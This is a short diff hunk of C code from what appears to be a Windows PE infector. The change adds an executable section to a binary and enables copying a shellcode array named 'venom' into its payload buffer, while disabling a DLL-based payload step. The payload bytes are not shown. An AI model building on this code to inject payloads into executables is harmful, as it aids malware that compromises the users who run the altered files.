@@ -266,24 +266,24 @@ unsigned char venom[] =
         .data_size = NEW_SECTION_RAW_DATA_SIZE,
         .characteristics = IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_CNT_CODE | IMAGE_SCN_CNT_INITIALIZED_DATA
     };
-    IMAGE_SECTION_HEADER* new_header = build_new_section_push_back(exe_info, &new_section, 0, 0);    
+    IMAGE_SECTION_HEADER* new_header = build_new_section_push_back(exe_info, &new_section, 4, 4);    
     
     unsigned int processor_count = 1;
     unsigned int* processor_entry_points = malloc(sizeof(unsigned int) * processor_count);
 
-    /*
     // put venom in payload
     {
         printf("VENOM SIZE: %u\n", VENOM_SIZE);
         memcpy(payload_buffer, venom, VENOM_SIZE);
-    }
-    */
+    } 
 
     // put processor in payload
     unsigned int entry_point_offset = 0;
+    /*
     {
         entry_point_offset = build_single_processor(payload_buffer, "build/Process.dll", "fputs_payload");
     }
+    */
 
     /*
     // change call to jump instruction
